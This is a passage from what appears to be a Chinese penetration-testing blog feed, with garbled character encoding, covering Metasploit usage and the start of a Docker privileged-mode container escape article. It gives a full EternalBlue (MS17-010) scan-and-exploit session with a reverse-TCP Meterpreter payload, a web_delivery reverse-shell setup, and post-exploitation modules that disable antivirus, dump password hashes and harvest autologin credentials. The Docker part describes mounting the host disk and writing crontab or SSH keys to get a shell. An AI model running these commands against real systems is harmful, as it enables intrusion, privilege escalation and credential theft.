windows/x64/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.200RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.1.200msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.1.150LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.1.150msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit----------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="å®æˆ˜EXï¼šmsf-æ°¸æ’ä¹‹è“-ms17-010"><a href="#å®æˆ˜EXï¼šmsf-æ°¸æ’ä¹‹è“-ms17-010" class="headerlink" title="å®æˆ˜EXï¼šmsf æ°¸æ’ä¹‹è“ ms17-010"></a>å®æˆ˜EXï¼šmsf æ°¸æ’ä¹‹è“ ms17-010</h3><p>1ã€æ‰«æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.33.0/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.0/24msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">100</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">100</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.4:445      - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> x64 <span class="token punctuation">(</span><span class="token number">64</span>-bit<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned  <span class="token number">34</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">13</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned  <span class="token number">95</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">37</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">101</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">39</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">104</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">134</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">52</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">167</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">65</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">180</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">70</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">206</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">80</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">233</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">91</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.33.0/24:445   - Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completedmsf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2ã€æ”»å‡»</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHoSTS <span class="token number">192.168</span>.33.4 RHoSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.4msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.33.12LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.27.12.png" style="zoom:50%;"><p>3ã€æ‰§è¡Œmeterpreter</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.27.45.png" style="zoom:50%;"><p>è¿›å…¥shellåœ¨èƒ½æ‰§è¡Œwhoamiï¼Œå¹¶ä¸”è·å¾—systemæƒé™ã€‚</p></blockquote><h2 id="5-6-Metepreterå‘½ä»¤"><a href="#5-6-Metepreterå‘½ä»¤" class="headerlink" title="5.6 Metepreterå‘½ä»¤"></a>5.6 Metepreterå‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>background</td><td>å°†Meterpreter ç»ˆç«¯éšè—åœ¨åå°</td></tr><tr><td>sessions</td><td>æŸ¥çœ‹å·²ç»æˆåŠŸè·å–çš„ä¼šè¯ã€‚-i é€‰é¡¹ï¼Œåˆ‡å…¥åå°ä¼šè¯</td></tr><tr><td>shell</td><td>è·å–ç³»ç»Ÿçš„æ§åˆ¶å°shell</td></tr><tr><td>quit</td><td>å…³é—­å½“å‰çš„Meterpreter ä¼šè¯ï¼Œè¿”å›MSF ç»ˆç«¯</td></tr><tr><td>pwd</td><td>è·å–ç›®æ ‡æœºä¸Šå½“å‰çš„å·¥ä½œç›®å½•</td></tr><tr><td>cd</td><td>åˆ‡æ¢ç›®å½• ä¸¤ä¸ªåæ–œæ </td></tr><tr><td>ls</td><td>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹å†…å®¹</td></tr><tr><td>upload</td><td>ä¸Šä¼ æ–‡ä»¶</td></tr><tr><td>cat</td><td>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</td></tr><tr><td>edit</td><td>ç¼–è¾‘æ–‡ä»¶</td></tr><tr><td>download</td><td>ä¸‹è½½æ–‡ä»¶</td></tr><tr><td>search</td><td>æœç´¢æ–‡ä»¶</td></tr><tr><td>ifconfig/ipconfig</td><td>æŸ¥çœ‹ç½‘å¡ä¿¡æ¯</td></tr><tr><td>route</td><td>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ï¼Œè®¾ç½®è·¯ç”±</td></tr><tr><td>sysinfo</td><td>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</td></tr><tr><td>getuid</td><td>è·å–å½“å‰ç”¨æˆ·id</td></tr><tr><td>ps</td><td>çœ‹è¿›ç¨‹</td></tr><tr><td>getpid</td><td>æŸ¥çœ‹å½“å‰è¿›ç¨‹</td></tr><tr><td>migrate</td><td>åˆ‡æ¢è¿›ç¨‹(åˆ‡æ¢èµ„æºç®¡ç†å™¨exploer.exe)</td></tr><tr><td>execute</td><td>æ‰§è¡Œæ–‡ä»¶</td></tr><tr><td>kill</td><td>ç»ˆç»“æŒ‡å®šPID çš„è¿›ç¨‹</td></tr><tr><td>shutdown</td><td>å…³æœº</td></tr><tr><td>screenshot</td><td>å±å¹•å¿«ç…§</td></tr></tbody></table><h1 id="å…­ã€MSF-è¿›é˜¶å®æˆ˜"><a href="#å…­ã€MSF-è¿›é˜¶å®æˆ˜" class="headerlink" title="å…­ã€MSF è¿›é˜¶å®æˆ˜"></a>å…­ã€MSF è¿›é˜¶å®æˆ˜</h1><h2 id="6-1-exploit"><a href="#6-1-exploit" class="headerlink" title="6.1 exploit"></a>6.1 exploit</h2><h3 id="6-1-1-exploit-multi-script-web-delivery-æ¨¡å—"><a href="#6-1-1-exploit-multi-script-web-delivery-æ¨¡å—" class="headerlink" title="6.1.1 exploit/multi/script/web_delivery æ¨¡å—"></a>6.1.1 exploit/multi/script/web_delivery æ¨¡å—</h3><h4 id="1ï¼‰ç®€ä»‹"><a href="#1ï¼‰ç®€ä»‹" class="headerlink" title="1ï¼‰ç®€ä»‹"></a>1ï¼‰ç®€ä»‹</h4><p>exploit/multi/script/web_delivery æ˜¯ Metasploit Framework ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œä¸»è¦ç”¨äºè¿œç¨‹æ‰§è¡Œä»£ç ã€‚å®ƒé€šè¿‡ Web æœåŠ¡å™¨å‘å—å®³è€…çš„æµè§ˆå™¨å‘é€æ¶æ„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬ä¼šåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œã€‚</p><p>åŠŸèƒ½å’Œç”¨é€”</p><ul><li><strong>å¿«é€Ÿå»ºç«‹ä¼šè¯</strong>ï¼šè¯¥æ¨¡å—å¯ä»¥åœ¨æ”»å‡»è€…çš„æœºå™¨ä¸Šå¿«é€Ÿå¯åŠ¨ä¸€ä¸ª Web æœåŠ¡å™¨ï¼Œæ‰˜ç®¡æœ‰æ•ˆè´Ÿè½½ã€‚å½“ç›®æ ‡æœºå™¨è¿æ¥åˆ°è¯¥æœåŠ¡å™¨å¹¶æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªä¼šè¯ã€‚</li><li><strong>æ”¯æŒå¤šç§è„šæœ¬è¯­è¨€</strong>ï¼šæ”¯æŒ Pythonã€PHP å’Œ PowerShell ç­‰è„šæœ¬è¯­è¨€ï¼Œå¯ä»¥æ ¹æ®ç›®æ ‡ç¯å¢ƒé€‰æ‹©åˆé€‚çš„è¯­è¨€ã€‚</li><li><strong>éšè”½æ€§å¼º</strong>ï¼šç”±äºæœ‰æ•ˆè´Ÿè½½ä¸ä¼šå†™å…¥ç›®æ ‡æœºå™¨çš„ç£ç›˜ï¼Œå› æ­¤ä¸å¤ªå¯èƒ½è§¦å‘é˜²ç—…æ¯’è½¯ä»¶å’Œå…¶ä»–é˜²å¾¡æœºåˆ¶ã€‚</li><li><strong>åº”ç”¨åœºæ™¯</strong>ï¼šé€‚ç”¨äºæ¸—é€æµ‹è¯•å’Œæ”»å‡»æ¨¡æ‹Ÿï¼Œç‰¹åˆ«æ˜¯åœ¨å·²ç»è·å¾—ä¸€å®šæƒé™ä½†ä¸å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿçš„æƒ…å†µä¸‹ã€‚</li></ul><h4 id="2ï¼‰ä½¿ç”¨æ–¹æ³•"><a href="#2ï¼‰ä½¿ç”¨æ–¹æ³•" class="headerlink" title="2ï¼‰ä½¿ç”¨æ–¹æ³•"></a>2ï¼‰ä½¿ç”¨æ–¹æ³•</h4><ol><li><p>åŠ è½½æ¨¡å—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">&gt;</span> use exploit/multi/script/web_delivery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>è®¾ç½®å‚æ•°ï¼š</p><ul><li><strong>é€‰æ‹©ç›®æ ‡è¯­è¨€</strong>ï¼šä¾‹å¦‚ï¼Œé€‰æ‹© PHP æˆ– PowerShell.</li><li><strong>è®¾ç½®æœ‰æ•ˆè´Ÿè½½</strong>ï¼šä¾‹å¦‚ï¼Œä½¿ç”¨ <code>php/meterpreter/reverse_tcp</code> ä½œä¸ºæœ‰æ•ˆè´Ÿè½½.</li><li><strong>è®¾ç½®ç›‘å¬åœ°å€å’Œç«¯å£</strong>ï¼šä¾‹å¦‚ï¼Œ<code>set lhost 192.168.1.100</code> å’Œ <code>set lport 8080</code> .</li><li>TARGETï¼š</li></ul><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2015.12.55.png" alt="msf6çš„æƒ…å½¢" style="zoom:40%;"></li><li><p>è¿è¡Œæ¨¡å—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿è¡Œåï¼Œæ¨¡å—ä¼šç”Ÿæˆä¸€ä¸ªå‘½ä»¤ï¼Œè¯¥å‘½ä»¤éœ€è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»¥ä¸‹è½½å¹¶è¿è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚</p></li></ol><h4 id="3ï¼‰å®æˆ˜"><a href="#3ï¼‰å®æˆ˜" class="headerlink" title="3ï¼‰å®æˆ˜"></a>3ï¼‰å®æˆ˜</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> target <span class="token number">7</span>    <span class="token comment"># é€‰æ‹©ç›®æ ‡ç³»ç»Ÿ</span><span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.7<span class="token builtin class-name">set</span> lport <span class="token number">4446</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸ƒã€å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#ä¸ƒã€å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸ƒã€å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>ä¸ƒã€å†…ç½‘ä¿¡æ¯æ”¶é›†</h1><p>å½“æˆ‘ä»¬è®¾ç½®å…¨å±€ä»£ç†ï¼ˆé€šå¸¸å¯ä»¥é€šè¿‡ewç­‰éš§é“å·¥å…·+proxychainsæ¥å®ç°ï¼‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨MSFä¸­ä½¿ç”¨æ¨¡å—æ¥å¯¹å†…ç½‘æ®µè¿›è¡Œæ‰«æï¼š</p><h2 id="7-1-æ‰«æ"><a href="#7-1-æ‰«æ" class="headerlink" title="7.1 æ‰«æ"></a>7.1 æ‰«æ</h2><p>å¸¸ç”¨çš„æ‰«ææ¨¡å—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/discovery/arp_sweep <span class="token comment">#åŸºäºarpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœºï¼Œè¿™ä¸èƒ½é€šè¿‡ä»£ç†ä½¿ç”¨</span>auxiliary/scanner/portscan/ack <span class="token comment">#åŸºäºtcpçš„ackå›å¤è¿›è¡Œç«¯å£æ‰«æï¼Œé»˜è®¤æ‰«æ1-10000ç«¯å£</span>auxiliary/scanner/portscan/tcp <span class="token comment">#åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æï¼Œé»˜è®¤æ‰«æ1-10000ç«¯å£</span>auxiliary/scanner/discovery/udp_sweep <span class="token comment">#åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary/scanner/discovery/udp_probe <span class="token comment">#åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary/scanner/netbios/nbname <span class="token comment">#åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary/scanner/ftp/ftp_version <span class="token comment">#å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£</span>auxiliary/scanner/ssh/ssh_version <span class="token comment">#å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£</span>auxiliary/scanner/telnet/telnet_version <span class="token comment">#å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£</span>auxiliary/scanner/dns/dns_amp <span class="token comment">#å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£</span>auxiliary/scanner/http/http_version <span class="token comment">#å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£</span>auxiliary/scanner/http/title <span class="token comment">#æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜</span>auxiliary/scanner/smb/smb_version <span class="token comment">#å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£</span>auxiliary/scanner/mssql/mssql_schemadump <span class="token comment">#å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£</span>auxiliary/scanner/oracle/oracle_hashdump <span class="token comment">#å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£</span>auxiliary/scanner/mysql/mysql_version <span class="token comment">#å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£</span>auxiliary/scanner/rdp/rdp_scanner <span class="token comment">#å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£</span>auxiliary/scanner/redis/redis_server <span class="token comment">#å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£</span>auxiliary/scanner/db2/db2_version <span class="token comment">#æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„50000ç«¯å£</span>auxiliary/scanner/netbios/nbname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-2-åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#7-2-åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="7.2 åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>7.2 åŸŸå†…ä¿¡æ¯æ”¶é›†</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_logged_on_users <span class="token comment">#æŸ¥çœ‹ç™»å½•è¿‡çš„ç”¨æˆ·ä¿¡æ¯</span>run post/windows/gather/enum_ad_groups <span class="token comment">#æŸ¥çœ‹ç»„ä¿¡æ¯</span>run post/windows/gather/enum_domain <span class="token comment">#å®šä½åŸŸæ§</span>run post/windows/gather/enum_ad_computers <span class="token comment">#åŸŸå†…æ‰€æœ‰æœºå™¨</span>run post/windows/gather/enum_patches <span class="token comment">#å‘ç°ç¼ºå¤±çš„è¡¥ä¸</span>run post/multi/recon/local_exploit_suggester <span class="token comment">#å¿«é€Ÿè¯†åˆ«å¯èƒ½è¢«åˆ©ç”¨çš„æ¼æ´</span>run post/windows/manage/migrate <span class="token comment">#è‡ªåŠ¨è¿›ç¨‹è¿ç§»</span>run post/windows/gather/checkvm <span class="token comment">#æŸ¥çœ‹ç›®æ ‡ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š</span>run post/windows/manage/killav <span class="token comment">#å…³é—­æ€æ¯’è½¯ä»¶</span>run post/windows/manage/enable_rdp <span class="token comment">#å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡</span>run post/windows/manage/autoroute <span class="token comment">#æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</span>run post/windows/gather/enum_logged_on_users <span class="token comment">#åˆ—ä¸¾å½“å‰ç™»å½•çš„ç”¨æˆ·</span>run post/windows/gather/enum_applications <span class="token comment">#åˆ—ä¸¾åº”ç”¨ç¨‹åº</span>run post/windows/gather/credentials/windows_autologin <span class="token comment">#æŠ“å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç </span>run post/windows/gather/smart_hashdump <span class="token comment">#dumpå‡ºæ‰€æœ‰ç”¨æˆ·çš„hash</span>run post/windows/gather/enum_domain_tokens <span class="token comment">#å¯»æ‰¾åŸŸtoken</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>.</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> MSF </tag>
            
            <tag> Metasploit Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸</title>
      <link href="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/"/>
      <url>/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ¼æ´ç®€ä»‹"><a href="#ä¸€ã€æ¼æ´ç®€ä»‹" class="headerlink" title="ä¸€ã€æ¼æ´ç®€ä»‹"></a>ä¸€ã€æ¼æ´ç®€ä»‹</h1><p>Dockerç‰¹æƒæ¨¡å¼æ˜¯ä¸€ç§å®¹å™¨è¿è¡Œæ¨¡å¼ï¼Œå®ƒå…è®¸å®¹å™¨ä»¥è¾ƒé«˜çš„æƒé™è¿è¡Œï¼Œä»è€Œèƒ½å¤Ÿè®¿é—®å®¿ä¸»æœºçš„å‡ ä¹æ‰€æœ‰è®¾å¤‡å’Œèµ„æºã€‚ç‰¹æƒæ¨¡å¼çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æä¾›æ›´å¤§çš„çµæ´»æ€§å’ŒåŠŸèƒ½ï¼Œä»¥ä¾¿å®¹å™¨å¯ä»¥æ‰§è¡Œä¸€äº›é€šå¸¸éœ€è¦æ›´é«˜æƒé™çš„æ“ä½œã€‚</p><p>ç‰¹æƒæ¨¡å¼åœ¨6.0ç‰ˆæœ¬çš„æ—¶å€™è¢«å¼•å…¥Dockerï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯å…è®¸å®¹å™¨å†…çš„rootæ‹¥æœ‰å¤–éƒ¨ç‰©ç†æœºçš„rootæƒé™ï¼Œè€Œæ­¤å‰åœ¨å®¹å™¨å†…çš„rootç”¨æˆ·åªæœ‰å¤–éƒ¨ç‰©ç†æœºæ™®é€šç”¨æˆ·çš„æƒé™ã€‚</p><p>Dockerç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸æ˜¯æŒ‡åœ¨å®¹å™¨ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®¹å™¨çš„é«˜æƒé™è®¿é—®å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿæˆ–å…¶ä»–èµ„æºï¼Œä»è€Œå®ç°å¯¹å®¿ä¸»æœºçš„æ§åˆ¶ã€‚</p><h1 id="äºŒã€é€ƒé€¸çš„åŸºæœ¬åŸç†"><a href="#äºŒã€é€ƒé€¸çš„åŸºæœ¬åŸç†" class="headerlink" title="äºŒã€é€ƒé€¸çš„åŸºæœ¬åŸç†"></a>äºŒã€é€ƒé€¸çš„åŸºæœ¬åŸç†</h1><p>å½“ç®¡ç†å‘˜æ‰§è¡Œdocker run â€”privilegedæ—¶ï¼ŒDockerå®¹å™¨å°†è¢«å…è®¸è®¿é—®ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼Œå¹¶å¯ä»¥æ‰§è¡Œmountå‘½ä»¤è¿›è¡ŒæŒ‚è½½ã€‚</p><p>å½“æ§åˆ¶ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„å®¹å™¨æ—¶ï¼Œdockerç®¡ç†å‘˜å¯é€šè¿‡mountå‘½ä»¤å°†å¤–éƒ¨å®¿ä¸»æœºç£ç›˜è®¾å¤‡æŒ‚è½½è¿›å®¹å™¨å†…éƒ¨ï¼Œè·å–å¯¹æ•´ä¸ªå®¿ä¸»æœºçš„æ–‡ä»¶è¯»å†™æƒé™ï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼åœ¨å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ã€‚</p><p>æ€»ä¹‹ï¼Œä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨åï¼ˆdocker run â€“privilegedï¼‰ï¼šDockerå®¹å™¨è¢«å…è®¸å¯ä»¥è®¿é—®ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ã€å¯ä»¥è·å–å¤§é‡è®¾å¤‡æ–‡ä»¶çš„è®¿é—®æƒé™ã€å¯é€šè¿‡mountå‘½ä»¤å°†å¤–éƒ¨å®¿ä¸»æœºç£ç›˜è®¾å¤‡æŒ‚è½½è¿›å®¹å™¨å†…éƒ¨ï¼Œè·å–å¯¹æ•´ä¸ªå®¿ä¸»æœºçš„æ–‡ä»¶è¯»å†™æƒé™ï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡contrabç­‰æ–¹å¼åœ¨å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ã€‚(åå¼¹shell)</p><h1 id="ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°å¤±è´¥ï¼‰"><a href="#ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°å¤±è´¥ï¼‰" class="headerlink" title="ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°å¤±è´¥ï¼‰"></a>ä¸‰ã€æ¼æ´å¤ç°ï¼ˆcentos7å¤ç°å¤±è´¥ï¼‰</h1><p>ç‰¹æƒæ¨¡å¼é€ƒé€¸æ˜¯ä¸€ç§æœ€ç®€å•æœ‰æ•ˆçš„é€ƒé€¸æ–¹æ³•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‚è½½å®¿ä¸»æœºç›®å½•åˆ°å®¹å™¨æŸä¸ªç›®å½•ä¸‹ï¼Œç›´æ¥é€šè¿‡å‘½ä»¤ã€å†™sshå…¬é’¥å’Œcrontabç­‰getshellã€‚</p><h2 id="3-1-ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨"><a href="#3-1-ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨" class="headerlink" title="3.1 ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨"></a>3.1 ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨</h2><p>ï¼ˆ1ï¼‰åˆ›å»ºå®¹å™¨æ—¶é€šè¿‡æ·»åŠ 